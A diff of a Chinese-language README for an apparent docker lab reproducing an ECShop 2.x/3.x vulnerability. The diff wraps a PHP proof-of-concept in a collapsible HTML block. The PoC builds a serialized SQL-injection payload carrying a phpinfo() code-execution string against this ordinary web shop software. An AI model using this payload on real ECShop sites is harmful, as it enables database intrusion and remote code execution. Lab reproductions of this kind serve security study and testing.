@@ -28,8 +28,10 @@ ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性�
 
 ```
 docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 环境启动后，访问`http://your-ip:8080`将看到2.7.3的安装页面，访问`http://your-ip:8081`将看到3.6.0的安装页面。
 
 依次安装二者，mysql地址填写`mysql`，mysql账户与密码均为`root`，数据库名随意填写，但2.7.3与3.6.0的数据库名不能相同。
@@ -41,12 +43,12 @@ docker-compose up -d
 POC脚本：
 
 ```php
-<?php
+&lt;?php
 $shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");
 $id = "-1' UNION/*";
 $arr = [
-    "num" => sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
-    "id" => $id
+    "num" =&gt; sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),
+    "id" =&gt; $id
 ];
 
 $s = serialize($arr);
@@ -57,8 +59,9 @@ $hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';
 echo "POC for ECShop 2.x: \n";
 echo "{$hash2}ads|{$s}{$hash2}";
 echo "\n\nPOC for ECShop 3.x: \n";
-echo "{$hash3}ads|{$s}{$hash3}";
-```
+echo "{$hash3}ads|{$s}{$hash3}";</code></pre>
+
+</details>
 
 ```
 POC for ECShop 2.x: 
